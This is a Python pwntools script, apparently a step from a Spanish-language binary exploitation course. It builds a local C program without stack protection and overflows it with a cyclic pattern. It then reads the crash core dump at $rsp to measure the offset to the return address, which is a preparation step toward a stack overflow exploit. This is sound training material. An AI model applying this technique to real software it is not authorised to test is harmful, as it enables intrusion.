#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A2 - Radiografia: medir el offset exacto hasta la direccion de retorno.
Metodo 1: cyclic() + corefile (automatico, requiere gdb en tu VM Kali).
Metodo 2: GEF - pattern create / pattern search (seccion A2 del PDF).
RECORDATORIO x86_64: el offset se lee desde $rsp, NO desde RIP.
USO: python3 a2_offset.py"""
from pwn import *
import os

context.arch = 'amd64'
context.log_level = 'info'

BIN = './a2_offset'

compile_cmd = ['gcc', '-g', '-O0', '-fno-stack-protector', '-no-pie',
               '-o', BIN, 'a2_offset.c']
log.info('Compilando: %s', ' '.join(compile_cmd))
process(compile_cmd).wait()

io = process(BIN)
io.recvuntil(b'listo para el patron ciclico')

# Patron ciclico de De Bruijn: cada 4 bytes del payload son una firma
# unica; cyclic_find() recupera la distancia exacta desde el buffer.
payload = cyclic(300)
io.sendline(payload)
io.wait()                        # el proceso muere con SIGSEGV

offset = None
core = None
try:
    # Metodo 1: pwntools pide un core dump al sistema y lo parsea.
    core = io.corefile
    # En x86_64 el ret YA consumio la direccion de retorno del tope:
    # el valor del patron esta en $rsp (advertencia del enunciado).
    valor = core.read(core.rsp, 4)
    offset = cyclic_find(valor)
    log.info('RIP del crash: %#x | $rsp: %#x | valor en $rsp: %r',
             core.rip, core.rsp, valor)
except Exception as e:
    # Metodo 2 fallback: buscar un core 'core' generado por el kernel.
    log.warn('io.corefile fallo (%s); buscando core del kernel...', e)
    if os.path.exists('core'):
        from pwnlib.corefile import Corefile
        core = Corefile('core')
        valor = core.read(core.rsp, 4)
        offset = cyclic_find(valor)

io.close()

if offset is not None and offset > 0:
    log.success('A2 SUPERADO: offset hasta la direccion de retorno = %d bytes',
                offset)
    log.info('Estructura: %d bytes de buffer/marco + 8 de RBP guardado.',
             offset - 8)
    log.info('A3 y A4 lo recalculan dinamicamente: nunca se hardcodea.')
else:
    log.failure('A2: sin core. Usa GEF: pattern create 300, corre y '
                'pattern search con el valor de $rsp.')
